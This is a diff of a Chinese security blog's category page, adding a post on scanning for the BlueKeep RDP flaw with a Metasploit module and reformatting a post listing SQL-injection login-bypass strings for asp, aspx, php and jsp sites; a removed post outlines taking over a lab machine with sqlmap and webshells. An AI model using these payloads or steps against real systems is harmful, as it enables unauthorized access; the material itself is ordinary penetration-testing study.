@@ -97,8 +97,6 @@
         
             <li><a href="%E7%B3%BB%E7%BB%9F.html">系统</a></li>
         
-            <li><a href="%E7%BD%91%E7%BB%9C.html">网络</a></li>
-        
             <li><a href="%E5%BC%80%E5%8F%91.html">开发</a></li>
         
             <li><a href="%E6%95%B0%E6%8D%AE%E5%BA%93.html">数据库</a></li>
@@ -131,6 +129,51 @@
 	<div class="large-8 medium-8 columns">
 		<div class="markdown-body home-categories">
 		
+			<div class="article">
+                <a class="clearlink" href="15595455557551.html">
+                
+                  <h1>使用 msf 检测 cve-2019-0708 WindowsRDP 远程代码执行漏洞</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<p>MSF模块：<a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb">https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</a></p>
+
+<p>前提：先在终端中更新 msf，使用命令<code>msfupdate</code>；如果没法更新，而 msf 版本又低就去 github 下载 msf 模块。</p>
+
+<p>现在开始验证：
+1、终端输入<code>msf</code>启动 msf
+2、使用 cve_2019_0708_bluekeep 模块：<code>use auxiliary/scanner/rdp/cve_2019_0708_bluekeep</code>
+3、设置目标计算机 ip：<code>set RHOSTS 192.168.1.1</code>，如果是域名，可以先 ping 得出 ip 地址。
+4、输入<code>exploit</code>开始检测，如果出现方框中的内容，则表示漏洞存在（相关 ip 已打码）。</p>
+
+<p><img src="media/15595455557551/15595462320619.jpg" alt=""/></p>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2019/06/03</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='%E5%AE%89%E5%85%A8.html'>安全</a></span>
+          				   
+                    
+
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
 			<div class="article">
                 <a class="clearlink" href="15591786403220.html">
                 
@@ -200,7 +243,7 @@
                       <div class="a-content-text">
                         
                         	<blockquote>
-<p>在测试某网站富文本编辑器时发现其使用了 markdown，md 会把文本转换成 html，那么肯定存在 xss 的问题，那么如何进行测试呢？于是我搜索了一番，发现前人已经有很好的研究成果了，但是鉴于安全问题的敏感，这里我就不贴原文出处了，不过感谢原作者JakobRPennington的贡献。</p>
+<p>在测试某网站富文本编辑器时发现其使用了 markdown，md 会把文本转换成 html，那么肯定存在 xss 的问题，那么如何进行测试呢？于是我搜索了一番，发现前人已经有很好的研究成果了，感谢原作者JakobRPennington的贡献。</p>
 </blockquote>
 
 <p>Links</p>
@@ -395,15 +438,16 @@
                       <div class="a-content-text">
                         
                         	<blockquote>
-<p>内容收集自网络，是否有效并未验证
-原文链接：<a href="https://blog.csdn.net/u012804180/article/details/51932863">asp、aspx、php、jsp万能密码大全</a></p>
+<p>内容收集自网络，是否有效并未验证。原文链接：<a href="https://blog.csdn.net/u012804180/article/details/51932863">asp、aspx、php、jsp万能密码大全</a></p>
 </blockquote>
 
-<p>-------asp万能密码 
-      &#39;or&#39;=&#39;or&#39;</p>
+<h2 id="toc_0">asp万能密码 </h2>
 
-<p>--------aspx万能密码
-   1： &quot;or &quot;a&quot;=&quot;a
+<p>      &#39;or&#39;=&#39;or&#39;</p>
+
+<h2 id="toc_1">aspx万能密码</h2>
+
+<p>   1： &quot;or &quot;a&quot;=&quot;a
    2： &#39;)or(&#39;a&#39;=&#39;a
    3：or 1=1--
    4：&#39;or 1=1--
@@ -426,17 +470,21 @@
    Password=1</p>
 
 <p>   17..admin&#39; or &#39;a&#39;=&#39;a 密码随便
- 
---------PHP万能密码
-   &#39;or&#39;=&#39;or&#39;
+ </p>
+
+<h2 id="toc_2">PHP万能密码</h2>
+
+<p>   &#39;or&#39;=&#39;or&#39;
    &#39;or 1=1/*  字符型 GPC是否开都可以使用</p>
 
 <p>   User: something
    Pass: &#39; OR &#39;1&#39;=&#39;1</p>
 
-<p> 
---------jsp 万能密码
-   1&#39;or&#39;1&#39;=&#39;1
+<p> </p>
+
+<h2 id="toc_3">jsp 万能密码</h2>
+
+<p>   1&#39;or&#39;1&#39;=&#39;1
    admin&#39; OR 1=1/*
  
    用户名：admin    系统存在这个用户的时候 才用得上
@@ -458,48 +506,6 @@
                   <div class="more-left left">
                   
                     <span class="date">2019/05/23</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='%E5%AE%89%E5%85%A8.html'>安全</a></span>
-          				   
-                    
-
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
-			<div class="article">
-                <a class="clearlink" href="15554000328653.html">
-                
-                  <h1>最近遇到的一个靶机</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<p>1、查看 http 流量，后台扫描等进行信息收集，得出其用的是 xxxxcms，然后百度进一步进行信息收集，得出该 cms 存在过 sql 注入、文件包含等漏洞。
-2、全站测试 sql 注入，发现确实存在注入点
-3、上 sqlmap 进行扫描，得出管理员账号密码，得出 mysql 为普通用户权限。
-4、登录网站后台，利用文件包含漏洞获取部分.php 文件信息，对其进行编辑写入小马。（这块之前没怎么玩过，因此稍微花费了一点时间，目的达到了，不过不优雅）
-5、通过小马传入大马，然后连接大马。
-6、提权拿 linux 的 root，这里我不太懂，因此正在找资料，希望今晚能搞定提权这事。</p>
-
-<p>提权这块研究一下，搞出来了再写。目前的思路是通过 shell 查看操作系统版本和内核版本，查看已安装的包和程序，看看有没有一直漏洞可以利用。</p>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2019/04/16</span>
                     <span>posted in&nbsp;</span> 
           				  
           					    <span class="posted-in"><a href='%E5%AE%89%E5%85%A8.html'>安全</a></span>
@@ -573,8 +579,6 @@
         
             <a href="%E7%B3%BB%E7%BB%9F.html"><strong>系统</strong></a>
         
-            <a href="%E7%BD%91%E7%BB%9C.html"><strong>网络</strong></a>
-        
             <a href="%E5%BC%80%E5%8F%91.html"><strong>开发</strong></a>
         
             <a href="%E6%95%B0%E6%8D%AE%E5%BA%93.html"><strong>数据库</strong></a>
@@ -602,6 +606,12 @@
 	      
 		      
 			      <li class="post">
+			        <a href="15764947924982.html">Arch系常用技巧与问题汇总</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
 			        <a href="15747334018156.html">msfvenom各类木马生成脚本</a>
 			      </li>
 		     
@@ -614,19 +624,13 @@
 		  
 		      
 			      <li class="post">
-			        <a href="15708455642675.html">如何使用cmd开启3389端口与查看3389端口</a>
+			        <a href="15708455642675.html">windows渗透技巧</a>
 			      </li>
 		     
 		  
 		      
 			      <li class="post">
-			        <a href="15695779467285.html">给linux终端加一个移动到回收站的功能</a>
-			      </li>
-		     
-		  
-		      
-			      <li class="post">
-			        <a href="15694777838251.html">Proxmox TASK ERROR: Failed to run vncproxy.解决办法</a>
+			        <a href="15692949172295.html">Proxmox物理安装</a>
 			      </li>
 		     
 		  
